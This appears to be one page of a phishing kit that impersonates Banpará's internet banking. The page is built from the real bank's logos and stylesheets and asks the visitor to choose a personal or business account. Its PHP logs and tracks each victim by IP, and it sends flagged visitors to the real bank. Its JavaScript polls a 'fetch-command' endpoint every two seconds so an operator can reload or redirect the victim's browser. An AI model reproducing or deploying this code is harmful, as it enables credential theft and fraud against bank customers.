<?php

$ip = $api->getUserIp();
$cliente_id = $api->registrarOuAtualizarCliente($ip);

if($api->isStatus($ip) == 'deletado'){
    header('Location: https://www.banpara.b.br/');
    exit;
}

if($api->isStatus($ip) == 'deletado2'){
        $api->deleteips($ip);
        header('Location: https://www.banpara.b.br/');
        exit;
    }

$api->atualizarColuna($cliente_id, 'tela', 'tipo-de-conta');
$api->atualizarColuna($cliente_id, 'modal', 'fechada');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title>Internet Banking</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238">
    <link rel="icon" href="https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238" type="image/x-icon">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/lib/bootstrap.min.css?20231107130238">
    <link rel="stylesheet" href="https://internetbanking.banpara.b.br/ibpf/resources/css/pagina/login.css?20231107130238">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/background.jpg') no-repeat center center fixed;
            background-size: cover;
            flex-direction: column;
            position: relative;
        }
        .favicon {
            background-image: url('https://internetbanking.banpara.b.br/ibpf/resources/imagens/favicon.ico?20231107130238');
            width: 40px;
            height: 40px;
            background-size: cover;
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
        }
        .container {
            background-color: white;
            color: #002366;
            border-radius: 10px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            box-sizing: border-box;
            margin-top: 80px;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
            max-width: 100%;
        }
        h2 {
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .btn-group {
            display: flex;
            justify-content: space-between;
        }
        .btn {
            width: 48%;
            padding: 10px;
            background-color: #002366;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
        }
        @media (max-width: 600px) {
            .container {
                width: 90%;
            }
            .logo img {
                width: 120px;
            }
            h2 {
                font-size: 20px;
            }
            .btn {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="favicon"></div>
    <div class="container">
        <div class="logo">
            <img src="https://internetbanking.banpara.b.br/ibpf/resources/imagens/logo_azul.png?20231107130238" alt="Logo">
        </div>
        <h2>Acessar Conta</h2>
        <div class="btn-group">
            <button class="btn" onclick="location.href='conta'">Pessoa Física</button>
            <button class="btn" onclick="location.href='contapf'">Pessoa Jurídica</button>
        </div>
    </div>
</body>
</html>

<script type="text/javascript">
    window.addEventListener('pageshow', function(event) {
        if (event.persisted) {
            fetch('tipo-de-conta')
            location.reload();
        }
    });
    window.addEventListener('DOMContentLoaded', function() {
        const currentUrl = new URL(window.location.href);
        currentUrl.searchParams.set('timestamp', Date.now());
        window.history.replaceState({}, 'tipo-de-conta', currentUrl);
    });


    function fetchCommand() {
        fetch('fetch-command')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {

                try{

                    const comando = JSON.parse(data.comando);

                    if (comando.command == "reload") {
                        location.reload();
                    }

                    if (comando.command == "redirect") {
                        window.location.href = 'https://www.banpara.b.br/';
                    }
             
                }catch(e){

                }
                
            } else if (data.status === 'no_command') {

            }
        })
        .catch(error => {
            console.error('Erro ao buscar comando:', error);
        });
    }

    function startPolling() {
        fetchCommand();
        setInterval(() => {
            fetchCommand();
        }, 2000);
    }

    window.onload = startPolling;
</script>